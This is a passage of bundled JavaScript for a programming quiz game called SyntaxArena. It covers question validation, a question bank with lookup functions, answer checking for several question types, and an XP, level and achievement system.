    } else {
      if (seenIds.has(q.id)) {
        errs.push({ id: q.id, field: 'id', message: `Duplicate question ID: '${q.id}'` });
      }
      seenIds.add(q.id);

      const idPattern = /^(py|c|cpp|java|python|cyber|js|javascript|rust|sql)-(beg|int|exp|beginner|intermediate|expert)-[0-9]{3}$/;
      if (!idPattern.test(q.id)) {
        errs.push({ id: q.id, field: 'id', message: `ID '${q.id}' does not match standard pattern format.` });
      }
    }

    // 2. Language & Difficulty
    if (!ALLOWED_LANGUAGES.includes(q.language)) {
      errs.push({ id: qId, field: 'language', message: `Invalid language '${q.language}'. Expected one of: ${ALLOWED_LANGUAGES.join(', ')}` });
    }

    if (!ALLOWED_DIFFICULTIES.includes(q.difficulty)) {
      errs.push({ id: qId, field: 'difficulty', message: `Invalid difficulty '${q.difficulty}'. Expected one of: ${ALLOWED_DIFFICULTIES.join(', ')}` });
    }

    // 3. Type
    if (!ALLOWED_TYPES.includes(q.type)) {
      errs.push({ id: qId, field: 'type', message: `Invalid question type '${q.type}'.` });
    }

    // 4. Prompt, Hint & Explanation
    if (!q.prompt || typeof q.prompt !== 'string' || q.prompt.trim().length < 5) {
      errs.push({ id: qId, field: 'prompt', message: 'Prompt must be a non-empty string of at least 5 characters.' });
    }

    if (!q.hint || typeof q.hint !== 'string' || q.hint.trim().length < 10) {
      errs.push({ id: qId, field: 'hint', message: 'Hint must be a helpful conceptual clue of at least 10 characters.' });
    }

    if (!q.explanation || typeof q.explanation !== 'string' || q.explanation.trim().length < 30) {
      errs.push({ id: qId, field: 'explanation', message: 'Explanation must provide pedagogical reasoning of at least 30 characters.' });
    }

    // 5. Points
    const expectedPts = TIER_POINTS[q.difficulty];
    if (q.points !== undefined && q.points !== expectedPts) {
      errs.push({ id: qId, field: 'points', message: `Points (${q.points}) does not match standard tier points (${expectedPts}) for ${q.difficulty}.` });
    }

    // 6. Format-specific Invariants
    const cleanType = String(q.type || '').replace(/-/g, '_');

    if (cleanType === 'multiple_choice' || cleanType === 'predict_output') {
      if (Array.isArray(q.options)) {
        if (q.options.length < 2) {
          errs.push({ id: qId, field: 'options', message: 'Multiple choice questions must have at least 2 options.' });
        }

        // Verify correct answer is represented in options
        const optStrings = q.options.map(o => typeof o === 'object' && o !== null ? String(o.text || o.id) : String(o));
        const correctStr = String(q.correctAnswer);
        const matchesOption = optStrings.some(o => o.trim().toLowerCase() === correctStr.trim().toLowerCase());

        if (!matchesOption && cleanType === 'multiple_choice') {
          errs.push({
            id: qId,
            field: 'correctAnswer',
            message: `correctAnswer ('${correctStr}') does not match any entry in options: [${optStrings.join(', ')}]`
          });
        }
      }
    }

    if (cleanType === 'find_bug') {
      if (!q.code || typeof q.code !== 'string') {
        errs.push({ id: qId, field: 'code', message: 'find_bug questions require a non-empty code snippet.' });
      } else {
        const lineCount = q.code.split('\n').length;
        const target = q.targetLine !== undefined ? q.targetLine : q.correctAnswer;
        const targetNum = Number(target);
        if (isNaN(targetNum) || targetNum < 1 || targetNum > lineCount) {
          errs.push({
            id: qId,
            field: 'targetLine',
            message: `targetLine (${target}) is out of range [1, ${lineCount}].`
          });
        }
      }
    }

    if (cleanType === 'fill_code' || cleanType === 'complete_code') {
      if (!q.code || typeof q.code !== 'string') {
        errs.push({ id: qId, field: 'code', message: 'fill_code questions require a code template with blanks.' });
      }
      if (q.correctAnswer === undefined || q.correctAnswer === null || q.correctAnswer === '') {
        errs.push({ id: qId, field: 'correctAnswer', message: 'fill_code questions must specify the required filling token(s).' });
      }
    }

    return errs;
  }
};

/* --- End of js/question-validator.js --- */

/* --- Start of js/question-bank.js --- */
/**
 * SyntaxArena Question Bank Repository (Batch 4)
 * Central registry for all 240 curated programming questions across Python, C, C++, and Java.
 * Provides immutable retrieval, indexed lookups, and integrity validation.
 * Source of truth: docs/QUESTION_SCHEMA.md & docs/GAME_RULES.md
 */










// Aggregate master collection
const ALL_QUESTIONS = Object.freeze([
  ...pythonQuestions,
  ...cQuestions,
  ...cppQuestions,
  ...javaQuestions,
  ...cyberQuestions,
  ...javascriptQuestions,
  ...rustQuestions,
  ...sqlQuestions
]);

// Build index maps for fast O(1) lookups
const ID_INDEX = new Map();
const LANG_TIER_INDEX = {
  python: { beginner: [], intermediate: [], expert: [] },
  c: { beginner: [], intermediate: [], expert: [] },
  cpp: { beginner: [], intermediate: [], expert: [] },
  java: { beginner: [], intermediate: [], expert: [] },
  cyber: { beginner: [], intermediate: [], expert: [] },
  javascript: { beginner: [], intermediate: [], expert: [] },
  rust: { beginner: [], intermediate: [], expert: [] },
  sql: { beginner: [], intermediate: [], expert: [] }
};

ALL_QUESTIONS.forEach(q => {
  ID_INDEX.set(q.id, q);
  if (LANG_TIER_INDEX[q.language] && LANG_TIER_INDEX[q.language][q.difficulty]) {
    LANG_TIER_INDEX[q.language][q.difficulty].push(q);
  }
});

/**
 * Deep-clone a question object to prevent external mutation.
 * @param {object} q
 * @returns {object}
 */
function cloneQuestion(q) {
  if (!q) return null;
  return JSON.parse(JSON.stringify(q));
}

var QuestionBank = window.QuestionBank = {
  /**
   * Total number of questions in catalog.
   */
  get size() {
    return ALL_QUESTIONS.length;
  },

  /**
   * Return a cloned copy of all questions in the bank.
   * @returns {Array}
   */
  getAll() {
    return ALL_QUESTIONS.map(cloneQuestion);
  },

  /**
   * Get raw un-cloned list (internal read-only reference).
   * @returns {Array}
   */
  getRawAll() {
    return ALL_QUESTIONS;
  },

  /**
   * Retrieve all questions for a specified language.
   * @param {'python'|'c'|'cpp'|'java'} language
   * @returns {Array}
   */
  getByLanguage(language) {
    const lang = (language || '').toLowerCase().trim();
    return ALL_QUESTIONS
      .filter(q => q.language === lang)
      .map(cloneQuestion);
  },

  /**
   * Retrieve all questions for a specific language and difficulty tier.
   * @param {'python'|'c'|'cpp'|'java'} language
   * @param {'beginner'|'intermediate'|'expert'} difficulty
   * @returns {Array}
   */
  getByDifficulty(language, difficulty) {
    const lang = (language || '').toLowerCase().trim();
    const diff = (difficulty || '').toLowerCase().trim();
    const pool = (LANG_TIER_INDEX[lang] && LANG_TIER_INDEX[lang][diff]) || [];
    return pool.map(cloneQuestion);
  },

  /**
   * Find a single question by its unique identifier.
   * @param {string} id
   * @returns {object|null}
   */
  getById(id) {
    const q = ID_INDEX.get(id);
    return q ? cloneQuestion(q) : null;
  },

  /**
   * Filter questions using a custom predicate function.
   * @param {function(object): boolean} predicate
   * @returns {Array}
   */
  filter(predicate) {
    if (typeof predicate !== 'function') return [];
    return ALL_QUESTIONS.filter(predicate).map(cloneQuestion);
  },

  /**
   * Get aggregated statistical summary of question inventory.
   * @returns {{ total: number, byLanguage: object, byTier: object, byType: object }}
   */
  getStats() {
    const stats = {
      total: ALL_QUESTIONS.length,
      byLanguage: { python: 0, c: 0, cpp: 0, java: 0 },
      byTier: {
        python: { beginner: 0, intermediate: 0, expert: 0 },
        c: { beginner: 0, intermediate: 0, expert: 0 },
        cpp: { beginner: 0, intermediate: 0, expert: 0 },
        java: { beginner: 0, intermediate: 0, expert: 0 }
      },
      byType: {}
    };

    ALL_QUESTIONS.forEach(q => {
      if (stats.byLanguage[q.language] !== undefined) {
        stats.byLanguage[q.language]++;
      }
      if (stats.byTier[q.language] && stats.byTier[q.language][q.difficulty] !== undefined) {
        stats.byTier[q.language][q.difficulty]++;
      }
      const type = q.type || 'unknown';
      stats.byType[type] = (stats.byType[type] || 0) + 1;
    });

    return stats;
  },

  /**
   * Validate the entire question bank against the specification schema.
   * @param {object} [options]
   * @returns {{ valid: boolean, errors: Array, warnings: Array, stats: object }}
   */
  validate(options = { checkExactInventory: true }) {
    return QuestionValidator.validateAll(ALL_QUESTIONS, options);
  }
};

/* --- End of js/question-bank.js --- */

/* --- Start of js/answer-checker.js --- */
/**
 * SyntaxArena Answer Checker Module (Batch 4)
 * Pure validation engine for checking user submissions against question contracts.
 * Supports: multiple_choice, predict_output, find_bug, fill_code, code_tracing.
 * Source of truth: docs/QUESTION_SCHEMA.md & docs/GAME_RULES.md
 */

var AnswerChecker = window.AnswerChecker = {
  /**
   * Evaluate a user submission against a question definition.
   * @param {object} question - The question data object
   * @param {any} submission - The user's submitted answer
   * @returns {{ correct: boolean, normalizedAnswer: any, message: string }}
   */
  check(question, submission) {
    if (!question || typeof question !== 'object') {
      return { correct: false, normalizedAnswer: null, message: 'Invalid question object.' };
    }
    if (submission === null || submission === undefined || submission === '') {
      return { correct: false, normalizedAnswer: null, message: 'Empty submission.' };
    }

    const type = this._normalizeType(question.type);

    switch (type) {
      case 'find_bug':
        return this.checkFindBug(question, submission);

      case 'fill_code':
        return this.checkFillCode(question, submission);

      case 'predict_output':
      case 'code_tracing':
        return this.checkPredictOutput(question, submission);

      case 'multiple_choice':
      default:
        return this.checkMultipleChoice(question, submission);
    }
  },

  /**
   * Normalize question type identifier.
   */
  _normalizeType(rawType) {
    if (!rawType) return 'multiple_choice';
    const clean = String(rawType).toLowerCase().replace(/-/g, '_');
    if (clean === 'complete_code' || clean === 'fill_in_the_code') return 'fill_code';
    if (clean === 'trace_execution') return 'code_tracing';
    return clean;
  },

  /**
   * Check Multiple Choice Question.
   */
  checkMultipleChoice(question, submission) {
    const options = question.options || [];
    const correct = question.correctAnswer;
    const accepted = question.acceptedAnswers || [];

    let selectedText = null;

    // 0. Priority Check: Does submission directly match any option text or object?
    const rawStr = String(submission || '').trim();
    const directOpt = options.find(opt => {
      const optStr = typeof opt === 'object' && opt !== null ? (opt.text || opt.id) : String(opt);
      return this._normalizeWhitespace(optStr).toLowerCase() === this._normalizeWhitespace(rawStr).toLowerCase();
    });

    if (directOpt) {
      selectedText = typeof directOpt === 'object' && directOpt !== null ? (directOpt.text || directOpt.id) : String(directOpt);
    }
    // 1. Check if submission is numeric index (0, 1, 2, 3)
    else if (typeof submission === 'number' && Number.isInteger(submission)) {
      if (submission >= 0 && submission < options.length) {
        const opt = options[submission];
        selectedText = typeof opt === 'object' && opt !== null ? opt.text : String(opt);
      }
    }
    // 2. Check if submission is string index or letter ("A", "B", "C", "D" or "0", "1", "2")
    else if (typeof submission === 'string') {
      const trimmed = submission.trim();
      const upper = trimmed.toUpperCase();
      const letterIndex = ['A', 'B', 'C', 'D', 'E', 'F'].indexOf(upper);

      if (letterIndex >= 0 && letterIndex < options.length) {
        const opt = options[letterIndex];
        selectedText = typeof opt === 'object' && opt !== null ? opt.text : String(opt);
      } else if (/^\d+$/.test(trimmed)) {
        const idx = parseInt(trimmed, 10);
        if (idx >= 0 && idx < options.length) {
          const opt = options[idx];
          selectedText = typeof opt === 'object' && opt !== null ? opt.text : String(opt);
        }
      } else {
        selectedText = trimmed;
      }
    } else if (typeof submission === 'object' && submission !== null && submission.text) {
      selectedText = String(submission.text).trim();
    }

    if (!selectedText) {
      return { correct: false, normalizedAnswer: submission, message: 'Invalid option selection.' };
    }

    // Compare with correctAnswer and acceptedAnswers
    const isDirectMatch = this._matchesAny(selectedText, [correct, ...accepted]);
    return {
      correct: isDirectMatch,
      normalizedAnswer: selectedText,
      message: isDirectMatch ? 'Correct answer.' : 'Incorrect option selected.'
    };
  },

  /**
   * Check Predict Output Question.
   */
  checkPredictOutput(question, submission) {
    const correct = question.correctAnswer || question.expectedOutput;
    const accepted = question.acceptedAnswers || [];
    const targets = [correct, question.expectedOutput, ...accepted].filter(Boolean);

    // If question has options, evaluate as multiple choice or direct text
    if (Array.isArray(question.options) && question.options.length > 0) {
      const mcqResult = this.checkMultipleChoice(question, submission);
      if (mcqResult.correct) {
        return mcqResult;
      }
    }

    // Direct output text comparison
    const subStr = String(submission).trim();
    const isMatch = this._matchesAny(subStr, targets);

    return {
      correct: isMatch,
      normalizedAnswer: subStr,
      message: isMatch ? 'Correct output prediction.' : 'Output does not match expected result.'
    };
  },

  /**
   * Check Find the Bug Question.
   */
  checkFindBug(question, submission) {
    const targetLine = question.targetLine !== undefined ? question.targetLine : question.correctAnswer;
    const accepted = question.acceptedAnswers || [];

    let userLine = null;
    if (typeof submission === 'number') {
      userLine = submission;
    } else if (typeof submission === 'string') {
      const match = submission.match(/\d+/);
      if (match) {
        userLine = parseInt(match[0], 10);
      }
    } else if (typeof submission === 'object' && submission !== null && submission.line !== undefined) {
      userLine = parseInt(submission.line, 10);
    }

    const isDirectAccepted = accepted.some(a => String(a).trim().toLowerCase() === String(submission).trim().toLowerCase());

    if (userLine === null && !isDirectAccepted) {
      return { correct: false, normalizedAnswer: submission, message: 'Invalid line selection.' };
    }

    const isMatch = isDirectAccepted || (userLine === Number(targetLine)) || accepted.some(a => Number(a) === userLine);

    return {
      correct: isMatch,
      normalizedAnswer: userLine,
      message: isMatch ? 'Bug line successfully pinpointed.' : `Line ${userLine} does not contain the defect.`
    };
  },

  /**
   * Check Complete the Code Question.
   */
  checkFillCode(question, submission) {
    const correct = question.correctAnswer;
    const accepted = question.acceptedAnswers || [];

    // If options are provided, check MCQ style
    if (Array.isArray(question.options) && question.options.length > 0) {
      const mcqResult = this.checkMultipleChoice(question, submission);
      if (mcqResult.correct) {
        return mcqResult;
      }
    }

    // Multi-blank array submission
    if (Array.isArray(submission)) {
      const subTokens = submission.map(s => String(s).trim());
      let isMatch = false;

      if (Array.isArray(correct)) {
        isMatch = subTokens.length === correct.length &&
                  subTokens.every((t, i) => this._compareTokens(t, correct[i]));
      }

      return {
        correct: isMatch,
        normalizedAnswer: subTokens,
        message: isMatch ? 'Code tokens slotted correctly.' : 'Code tokens do not match required template.'
      };
    }

    // Single blank string token
    const subToken = String(submission).trim();
    const targets = [correct, ...accepted].filter(Boolean);
    const isMatch = targets.some(t => this._compareTokens(subToken, t));

    return {
      correct: isMatch,
      normalizedAnswer: subToken,
      message: isMatch ? 'Code token matched.' : 'Incorrect syntax token.'
    };
  },

  /**
   * Helper: compare candidate against target array with whitespace normalization.
   */
  _matchesAny(candidate, targets) {
    if (!candidate) return false;
    const normCand = this._normalizeWhitespace(candidate);

    return targets.some(t => {
      if (t === null || t === undefined) return false;
      const normTarget = this._normalizeWhitespace(String(t));
      return normCand.toLowerCase() === normTarget.toLowerCase() || normCand === normTarget;
    });
  },

  /**
   * Helper: compare two code tokens ignoring peripheral spaces.
   */
  _compareTokens(a, b) {
    if (a === null || a === undefined || b === null || b === undefined) return false;
    return String(a).replace(/\s+/g, ' ').trim() === String(b).replace(/\s+/g, ' ').trim();
  },

  /**
   * Normalize CRLF/LF and collapse multiple spaces while preserving meaningful indentation.
   */
  _normalizeWhitespace(str) {
    return String(str)
      .replace(/\r\n/g, '\n')
      .replace(/[ \t]+/g, ' ')
      .trim();
  }
};

/* --- End of js/answer-checker.js --- */

/* --- Start of js/gamification.js --- */
/**
 * SyntaxArena Gamification System & Player Rewards (Batch 6)
 * Pure client-side progression engine: XP yields, 10-level ranks, streak records,
 * extensible achievement badges, unlockable cosmetics, and challenge modes.
 * Source of truth: docs/GAME_RULES.md, docs/ARCHITECTURE.md, docs/MVP_SPEC.md
 */


// =============================================================================
// 1. LEVEL & RANK THRESHOLDS (docs/GAME_RULES.md §2.2)
// =============================================================================
var LEVEL_THRESHOLDS = window.LEVEL_THRESHOLDS = Object.freeze([
  { level: 1,  title: 'Script Novice',       requiredXP: 0,     reward: 'Base Avatars & Cyber Studio Theme' },
  { level: 2,  title: 'Syntax Apprentice',   requiredXP: 250,   reward: 'Studio Paper (Light Theme)' },
  { level: 3,  title: 'Logic Crafter',       requiredXP: 600,   reward: 'Speedrun Mode (20s Timer)' },
  { level: 4,  title: 'Byte Explorer',       requiredXP: 1200,  reward: 'Avatar: Hex Dragon' },
  { level: 5,  title: 'Algorithm Ace',       requiredXP: 2000,  reward: 'Hardcore Mode (3 Hearts)' },
  { level: 6,  title: 'Pointer Pilot',       requiredXP: 3200,  reward: 'Theme: Amber Flame Mode' },
  { level: 7,  title: 'Memory Architect',    requiredXP: 4800,  reward: 'Avatar: Glitch Bot' },
  { level: 8,  title: 'System Sage',         requiredXP: 6800,  reward: 'Sound Pack: Retro 8-Bit Chiptune' },
  { level: 9,  title: 'Kernel Master',       requiredXP: 9200,  reward: 'Holographic Profile Frame' },
  { level: 10, title: 'Grandmaster of Code', requiredXP: 12000, reward: 'Crown Badge & Golden Accent Mode' }
]);

var MAX_LEVEL = window.MAX_LEVEL = LEVEL_THRESHOLDS[LEVEL_THRESHOLDS.length - 1].level;

// =============================================================================
// 2. XP YIELD CONFIGURATION (docs/GAME_RULES.md §2.1)
// =============================================================================
var XP_RULES = window.XP_RULES = Object.freeze({
  beginnerCorrect: 50,
  intermediateCorrect: 100,
  expertCorrect: 150,
  flawlessBonus: 100,    // 100% accuracy in >= 10 questions
  dailyClearBonus: 300   // Daily challenge clear
});

// =============================================================================
// 3. COSMETICS & CHALLENGE MODES REGISTRY
// =============================================================================
var UNLOCKABLE_THEMES = window.UNLOCKABLE_THEMES = Object.freeze([
  { id: 'dark',  name: 'Cyber Studio',     requiredLevel: 1,  themeClass: 'dark',  description: 'Sleek neon-cyan dark arcade theme' },
  { id: 'light', name: 'Studio Paper',     requiredLevel: 2,  themeClass: 'light', description: 'Crisp editorial light mode with high contrast' },
  { id: 'amber', name: 'Amber Flame',      requiredLevel: 6,  themeClass: 'amber', description: 'Warm CRT amber phosphor arcade aesthetic' },
  { id: 'gold',  name: 'Grandmaster Gold', requiredLevel: 10, themeClass: 'gold',  description: 'Prestige obsidian and metallic gold theme' }
]);

var UNLOCKABLE_AVATARS = window.UNLOCKABLE_AVATARS = Object.freeze([
  { id: 'cyber_fox',    name: 'Cyber Fox',    requiredLevel: 1, symbol: '🦊', description: 'Quick, agile, and sharp-eyed.' },
  { id: 'terminal_owl', name: 'Terminal Owl', requiredLevel: 1, symbol: '🦉', description: 'Wise systems trace analyst.' },
  { id: 'matrix_cat',   name: 'Matrix Cat',   requiredLevel: 1, symbol: '🐱', description: 'Stealthy async bug stalker.' },
  { id: 'bit_knight',   name: 'Bit Knight',   requiredLevel: 1, symbol: '🛡️', description: 'Resilient compiler defender.' },
  { id: 'hex_dragon',   name: 'Hex Dragon',   requiredLevel: 4, symbol: '🐉', description: 'Fierce low-level memory lord.' },
  { id: 'glitch_bot',   name: 'Glitch Bot',   requiredLevel: 7, symbol: '🤖', description: 'Unpredictable logic hacker.' }
]);

var CHALLENGE_MODES = window.CHALLENGE_MODES = Object.freeze([
  { id: 'campaign', name: 'Campaign Mode',    requiredLevel: 1, icon: '🗺️', description: 'Tiered 20-question curriculum per language.' },
  { id: 'practice', name: 'Free Practice',    requiredLevel: 1, icon: '🎯', description: 'Relaxed or custom practice with full hint support.' },
  { id: 'speedrun', name: 'Speedrun Mode',    requiredLevel: 3, icon: '⏱️', description: 'High-adrenaline 20s countdown per challenge.' },
  { id: 'hardcore', name: 'Hardcore Mode',    requiredLevel: 5, icon: '💀', description: 'Strict 30s timer, hints disabled, 3 hearts.' }
]);

// =============================================================================
// 4. ACHIEVEMENT BADGES REGISTRY (20 Curated Achievements)
// =============================================================================
var ACHIEVEMENTS = window.ACHIEVEMENTS = Object.freeze([
  // --- Category: Milestones ---
  {
    id: 'first_blood',
    name: 'First Blood',
    description: 'Solve your first programming challenge correctly.',
    icon: '⚔️',
    category: 'milestones',
    difficulty: 'beginner',
    cost: 50,
    price: 50,
    evaluate: (profile, session) => {
      const correct = (profile?.stats?.questionsCorrect || 0) + (session?.questionsCorrect || 0);
      return correct >= 1;
    }
  },
  {
    id: 'first_session',
    name: 'Arena Initiate',
    description: 'Complete your first full challenge session.',
    icon: '🏁',
    category: 'milestones',
    difficulty: 'beginner',
    cost: 50,
    price: 50,
    evaluate: (profile, session) => {
      return (profile?.stats?.gamesPlayed || 0) >= 1 || session?.isCompleted === true;
    }
  },
  {
    id: 'century_club',
    name: 'Century Club',
    description: 'Attempt 100 programming challenges across your career.',
    icon: '💯',
    category: 'milestones',
    difficulty: 'expert',
    cost: 250,
    price: 250,
    evaluate: (profile, session) => {
      const attempted = (profile?.stats?.questionsAttempted || 0) + (session?.questionsAttempted || 0);
      return attempted >= 100;
    }
  },
  {
    id: 'veteran',
    name: 'Syntax Veteran',
    description: 'Complete 5 full challenge sessions in the arena.',
    icon: '🎖️',
    category: 'milestones',
    difficulty: 'intermediate',
    cost: 120,
    price: 120,
    evaluate: (profile, session) => {
      const games = (profile?.stats?.gamesPlayed || 0) + (session?.isCompleted ? 1 : 0);
      return games >= 5;
    }
  },

  // --- Category: Streaks ---
  {
    id: 'streak_3',
    name: 'Blue Flare',
    description: 'Achieve a 3-question answer streak in a session.',
    icon: '🔹',
    category: 'streaks',
    difficulty: 'beginner',
    cost: 60,
    price: 60,
    evaluate: (profile, session) => {
      return (session?.highestStreak || 0) >= 3 || (profile?.stats?.highestStreak || 0) >= 3;
    }
  },
  {
    id: 'streak_5',
    name: 'Amber Blaze',
    description: 'Achieve a 5-question answer streak in a session.',
    icon: '🔥',
    category: 'streaks',
    difficulty: 'intermediate',
    cost: 120,
    price: 120,
    evaluate: (profile, session) => {
      return (session?.highestStreak || 0) >= 5 || (profile?.stats?.highestStreak || 0) >= 5;
    }
  },
  {
    id: 'streak_8',
    name: 'Plasma Supernova',
    description: 'Achieve an 8-question streak and hit the 3.0x Max Multiplier.',
    icon: '⚡',
    category: 'streaks',
    difficulty: 'expert',
    cost: 220,
    price: 220,
    evaluate: (profile, session) => {
      return (session?.highestStreak || 0) >= 8 || (profile?.stats?.highestStreak || 0) >= 8;
    }
  },

  // --- Category: Accuracy & Mastery ---
  {
    id: 'proficient',
    name: 'Proficient Deductor',
    description: 'Complete a challenge session with at least 75% accuracy (⭐⭐).',
    icon: '🎯',
    category: 'accuracy',
    difficulty: 'intermediate',
    cost: 120,
    price: 120,
    evaluate: (profile, session) => {
      return Boolean(session && session.isCompleted && session.accuracy >= 75);
    }
  },
  {
    id: 'perfectionist',
    name: 'Flawless Execution',
    description: 'Achieve 100% accuracy in a session with at least 5 challenges.',
    icon: '💎',
    category: 'accuracy',
    difficulty: 'expert',
    cost: 250,
    price: 250,
    evaluate: (profile, session) => {
      if (!session) return false;
      const correct = session.questionsCorrect || 0;
      const total = session.totalQuestions || 0;
      const accuracy = session.accuracy !== undefined ? session.accuracy : (total > 0 ? (correct / total) * 100 : 0);
      return Boolean(accuracy >= 100 && total >= 5);
    }
  },
  {
    id: 'second_chance_hero',
    name: 'Second Chance Hero',
    description: 'Correctly solve a challenge on Second Chance retry after a hint.',
    icon: '🛡️',
    category: 'accuracy',
    difficulty: 'beginner',
    cost: 75,
    price: 75,
    evaluate: (profile, session) => {
      if (session?.retriesUsed > 0 && session?.questionsCorrect > 0) return true;
      const results = session?.results || session?.answers;
      return Boolean(results?.some(r => r && r.attempts > 1 && (r.isCorrect || r.correct)));
    }
  },
  {
    id: 'hint_master',
    name: 'Pedagogical Insight',
    description: 'Successfully solve 3 challenges in a single run with hint guidance.',
    icon: '💡',
    category: 'accuracy',
    difficulty: 'intermediate',
    cost: 100,
    price: 100,
    evaluate: (profile, session) => {
      return Boolean(session && (session.hintsUsed || 0) >= 3 && (session.questionsCorrect || 0) >= 3);
    }
  },

  // --- Category: Speed ---
  {
    id: 'speed_demon',
    name: 'Speed Demon',
    description: 'Solve a timed challenge correctly in under 5 seconds without hints.',
    icon: '⏱️',
    category: 'speed',
    difficulty: 'expert',
    cost: 220,
    price: 220,
    evaluate: (profile, session) => {
      const results = session?.results || session?.answers;
      if (!results || !Array.isArray(results)) return false;
      return results.some(r => {
        const isOk = r && (r.isCorrect || r.correct) && !r.usedHint;
        if (!isOk) return false;
        const limit = r.timeLimit || session?.timeLimit || 45;
        const taken = limit - (r.timeRemaining || 0);
        return taken > 0 && taken <= 5;
      });
    }
  },
  {
    id: 'blitz_solver',
    name: 'Blitz Deduction',
    description: 'Answer correctly with more than 80% of the countdown timer remaining.',
    icon: '🚀',
    category: 'speed',
    difficulty: 'intermediate',
    cost: 130,
    price: 130,
    evaluate: (profile, session) => {
      if (!session?.results) return false;
      return session.results.some(r => {
        return r.isCorrect && !r.usedHint && r.timeLimit > 0 && (r.timeRemaining || 0) >= (0.8 * r.timeLimit);
      });
    }
  },

  // --- Category: Language Polyglot ---
  {
    id: 'polyglot_python',
    name: 'Pythonista',
    description: 'Complete a full challenge session in Python 3.',
    icon: '🐍',
    category: 'polyglot',
    difficulty: 'beginner',
    cost: 75,
    price: 75,
    evaluate: (profile, session) => {
      return Boolean(session && session.isCompleted && session.language === 'python');
    }
  },
  {
    id: 'polyglot_c',
    name: 'C Systems Adept',
    description: 'Complete a full challenge session in C (C99).',
    icon: '⚙️',
    category: 'polyglot',
    difficulty: 'intermediate',
    cost: 120,
    price: 120,
    evaluate: (profile, session) => {
      return Boolean(session && session.isCompleted && session.language === 'c');
    }
  },
  {
    id: 'polyglot_cpp',
    name: 'Modern C++ Artisan',
    description: 'Complete a full challenge session in C++ (C++20).',
    icon: '⚡',
    category: 'polyglot',
    difficulty: 'intermediate',
    cost: 120,
    price: 120,
    evaluate: (profile, session) => {
      return Boolean(session && session.isCompleted && session.language === 'cpp');
    }
  },
  {
    id: 'polyglot_java',
    name: 'JVM Engineer',
    description: 'Complete a full challenge session in Java (SE 17).',
    icon: '☕',
    category: 'polyglot',
    difficulty: 'intermediate',
    cost: 120,
    price: 120,
    evaluate: (profile, session) => {
      return Boolean(session && session.isCompleted && session.language === 'java');
    }
  },
  {
    id: 'true_polyglot',
    name: 'True Polyglot',
    description: 'Earn stars across all 4 language tracks (Python, C, C++, Java).',
    icon: '👑',
    category: 'polyglot',
    difficulty: 'master',
    cost: 350,
    price: 350,
    evaluate: (profile, session) => {
      const camp = profile?.campaign || {};
      const languages = ['python', 'c', 'cpp', 'java'];
      return languages.every(lang => {
        const entry = camp[lang] || {};
        const hasStars = (entry.beginnerStars || 0) > 0 || (entry.intermediateStars || 0) > 0 || (entry.expertStars || 0) > 0;
        const currentMatch = Boolean(session && session.isCompleted && session.language === lang && session.accuracy >= 60);
        return hasStars || currentMatch;
      });
    }
  },

  // --- Category: Modes ---
  {
    id: 'hardcore_unlocked',
    name: 'Trial of Fire',
    description: 'Reach Level 5 (Algorithm Ace) to unlock Hardcore Mode.',
    icon: '🔥',
    category: 'modes',
    difficulty: 'expert',
    cost: 200,
    price: 200,
    evaluate: (profile) => {
      return (profile?.level || 1) >= 5;
    }
  },
  {
    id: 'hardcore_survivor',
    name: 'Iron Will',
    description: 'Complete a session in Hardcore Mode with hearts remaining.',
    icon: '🖤',
    category: 'modes',
    difficulty: 'master',
    cost: 300,
    price: 300,
    evaluate: (profile, session) => {
      return Boolean(session && session.isCompleted && session.mode === 'hardcore' && (session.lives === undefined || session.lives > 0));
    }
  }
]);

// Fast ID lookup map for achievements
const ACHIEVEMENTS_MAP = new Map(ACHIEVEMENTS.map(a => [a.id, a]));

// =============================================================================
// 5. MASTER GAMIFICATION CONTROLLER
// =============================================================================
var Gamification = window.Gamification = {
  LEVEL_THRESHOLDS,
  MAX_LEVEL,
  XP_RULES,
  UNLOCKABLE_THEMES,
  UNLOCKABLE_AVATARS,
  CHALLENGE_MODES,
  ACHIEVEMENTS,

  /**
   * Derive player level, title, and progress metrics from cumulative XP.
   * @param {number} totalXP
   * @returns {object} Level metadata and next-tier progress metrics
   */
  getLevelData(totalXP) {
    const xp = Math.max(0, parseInt(totalXP, 10) || 0);

    let currentTier = LEVEL_THRESHOLDS[0];
    let nextTier = LEVEL_THRESHOLDS[1] || null;

    for (let i = 0; i < LEVEL_THRESHOLDS.length; i++) {
      if (xp >= LEVEL_THRESHOLDS[i].requiredXP) {
        currentTier = LEVEL_THRESHOLDS[i];
        nextTier = LEVEL_THRESHOLDS[i + 1] || null;
      } else {
        break;
      }
    }

    const isMaxLevel = nextTier === null;
    const currentBaseXP = currentTier.requiredXP;
    const nextRequiredXP = nextTier ? nextTier.requiredXP : currentTier.requiredXP;
    const xpIntoLevel = xp - currentBaseXP;
    const xpSpan = nextRequiredXP - currentBaseXP;
    const xpNeededForNext = isMaxLevel ? 0 : Math.max(0, nextRequiredXP - xp);

    const progressPercent = isMaxLevel
      ? 100
      : Math.min(100, Math.max(0, Math.round((xpIntoLevel / xpSpan) * 100)));

    return {
      level: currentTier.level,
      title: currentTier.title,
      reward: currentTier.reward,
      currentXP: xp,
      currentBaseXP,
      nextRequiredXP,
      xpIntoLevel,
      xpNeededForNext,
      progressPercent,
      isMaxLevel
    };
  },

  /**
   * Derive level integer (1-10) directly from XP.
   */
  deriveLevel(totalXP) {
    return this.getLevelData(totalXP).level;
  },

  /**
   * Get rank title for given level.
   */
  getLevelTitle(level) {
    const tier = LEVEL_THRESHOLDS.find(t => t.level === level) || LEVEL_THRESHOLDS[0];
    return tier.title;
  },

  /**
   * Calculate detailed progression toward next level.
   */
  calculateLevelProgress(totalXP) {
    const data = this.getLevelData(totalXP);
    return {
      level: data.level,
      title: data.title,
      reward: data.reward,
      currentXP: data.currentXP,
      currentLevelThreshold: data.currentBaseXP,
      nextLevel: data.isMaxLevel ? data.level : data.level + 1,
      nextLevelThreshold: data.nextRequiredXP,
      xpToNextLevel: data.xpNeededForNext,
      progressPercent: data.isMaxLevel ? 1.0 : (data.progressPercent / 100),
      isMaxRank: data.isMaxLevel
    };
  },

  /**
   * Calculate verified XP earned from a completed game session.
   * Master rules: docs/GAME_RULES.md §2.1
   * @param {object} summary - Validated session summary
   * @returns {number} Non-negative XP yield
   */
  calculateSessionXP(summary) {
    if (!summary || typeof summary !== 'object') return 0;

    const results = summary.results || summary.answers;
    let earnedXP = 0;

    if (Array.isArray(results) && results.length > 0) {
      // Calculate itemized XP per answered question
      results.forEach(r => {
        if (r && (r.isCorrect || r.correct)) {
          const diff = (r.difficulty || summary.difficulty || 'beginner').toLowerCase();
          if (diff === 'expert') {
            earnedXP += XP_RULES.expertCorrect;
